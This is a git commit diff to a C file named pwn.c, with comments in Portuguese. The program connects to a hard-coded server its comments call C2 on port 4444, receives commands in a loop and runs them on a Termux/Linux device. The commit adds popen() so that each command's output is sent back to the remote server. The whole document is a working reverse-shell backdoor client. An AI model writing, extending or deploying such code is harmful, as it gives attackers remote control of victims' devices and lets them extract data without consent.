6329408ebb956e1bad0fc1aacf2202e9a83a3907
Maiquel Paiva <153939765+untw0@users.noreply.github.com>
2024-09-15 14:04:55 -0300

    Update pwn.c

--- pwn.c
+++ pwn.c
@@ -7,18 +7,20 @@
 int main() {
     int sock;
     struct sockaddr_in server;
-    const char *ip = "192.168.226.136"; // IP do servidor Linux C2
-    short port = 4444;
     char buffer[1024];
     int recv_size;
+    const char *ip = "192.168.226.136"; // IP do servidor Linux C2
+    short port = 4444;
+    char command[1024];
 
-    // Cria socket
+    // Cria o socket
     sock = socket(AF_INET, SOCK_STREAM, 0);
-    if (sock < 0) {
+    if (sock == -1) {
         perror("Falha ao criar socket");
         return 1;
     }
 
+    // Define a estrutura do servidor
     server.sin_family = AF_INET;
     server.sin_port = htons(port);
     server.sin_addr.s_addr = inet_addr(ip);
@@ -32,15 +34,26 @@ int main() {
 
     printf("Conectado ao servidor C2\n");
 
-    // Recebe comandos e os executa
+    // Loop para receber comandos e executá-los
     while ((recv_size = recv(sock, buffer, sizeof(buffer) - 1, 0)) > 0) {
         buffer[recv_size] = '\0'; // Garante que o buffer seja uma string válida
         printf("Comando recebido: %s\n", buffer);
 
-        // Executa o comando recebido no Linux (Termux)
-        system(buffer);
+        // Executa o comando recebido no Termux
+        FILE *fp;
+        fp = popen(buffer, "r"); // Executa o comando e obtém o resultado
+        if (fp == NULL) {
+            send(sock, "Falha ao executar comando", strlen("Falha ao executar comando"), 0);
+            continue;
+        }
 
-        // Envia resposta para o servidor
+        // Lê a saída do comando e envia de volta ao servidor
+        while (fgets(command, sizeof(command), fp) != NULL) {
+            send(sock, command, strlen(command), 0);
+        }
+        pclose(fp);
+
+        // Envia mensagem de comando executado
         send(sock, "Comando executado", strlen("Comando executado"), 0);
     }
 
